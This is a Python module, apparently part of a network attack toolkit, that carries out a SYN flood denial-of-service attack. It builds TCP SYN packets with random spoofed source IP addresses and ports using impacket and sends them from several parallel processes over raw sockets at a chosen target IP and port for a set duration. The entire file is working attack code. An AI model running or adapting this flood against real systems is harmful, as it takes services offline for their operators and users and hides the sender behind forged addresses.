import multiprocessing
import socket
import time
from impacket import ImpactPacket
from modules.attacks import tools as tm
from multiprocessing import Queue
from datetime import datetime


def syn_flood_attack(attack_thread_count: int, attacked_node_ip: str, attacked_node_port: int, attack_duration: int):
    """
    syn 泛洪攻击
    :param attack_thread_count 攻击线程数量
    :param attacked_node_ip 被攻击节点 ip
    :param attacked_node_port 被攻击节点 port
    :param attack_duration 攻击时长
    """
    # 暂停队列
    stop_queue = Queue(maxsize=1)
    # 攻击线程数量
    attack_processes = []
    # 开启指定数量的攻击进程
    for index in range(attack_thread_count):
        attack_process = multiprocessing.Process(target=syn_flood_attack_single_thread,
                                                 args=(attacked_node_ip,
                                                       attacked_node_port,
                                                       stop_queue))
        attack_process.start()
        # print(attacked_node_port, flush=True)
    # 攻击开始时间
    start_time = datetime.now()
    while True:
        time.sleep(1)
        # 当前时间
        current_time = datetime.now()
        # 已经过去的时间
        time_delta_in_seconds = (current_time - start_time).seconds
        # 超过时间退出
        if time_delta_in_seconds > attack_duration:
            break
    # 向队列发送停止攻击信号
    stop_queue.put("stop attack")
    for attack_process in attack_processes:
        attack_process.join()


def generate_syn_packet_with_random_source(attacked_node_ip: str, attacked_node_port: int):
    """
    构建 syn 数据包
    """
    random_source_ip = tm.RandomApi.rand_ipv4()  # 生成随机的 ipv4 地址
    random_source_port = tm.RandomApi.rand_int(32768, 65535)  # 生成随机的源端口
    ip_packet = ImpactPacket.IP()
    ip_packet.set_ip_src(random_source_ip)
    ip_packet.set_ip_dst(attacked_node_ip)
    tcp_packet = ImpactPacket.TCP()
    tcp_packet.set_SYN()
    tcp_packet.set_th_win(64)
    tcp_packet.set_th_flags(0x02)
    tcp_packet.set_th_sport(random_source_port)
    tcp_packet.set_th_dport(attacked_node_port)
    ip_packet.contains(tcp_packet)
    ip_packet.calculate_checksum()
    return ip_packet


def syn_flood_attack_single_thread(attacked_node_ip: str, attacked_node_port: int, stop_queue: Queue):
    """
    syn 单线程攻击
    """
    raw_socket = tm.Tools.raw_socket_creator(socket.IPPROTO_TCP)
    while True:
        tcp_syn_packet = generate_syn_packet_with_random_source(attacked_node_ip=attacked_node_ip,
                                                                attacked_node_port=attacked_node_port)
        raw_socket.sendto(tcp_syn_packet.get_packet(), (attacked_node_ip, attacked_node_port))
        if not stop_queue.empty():
            break
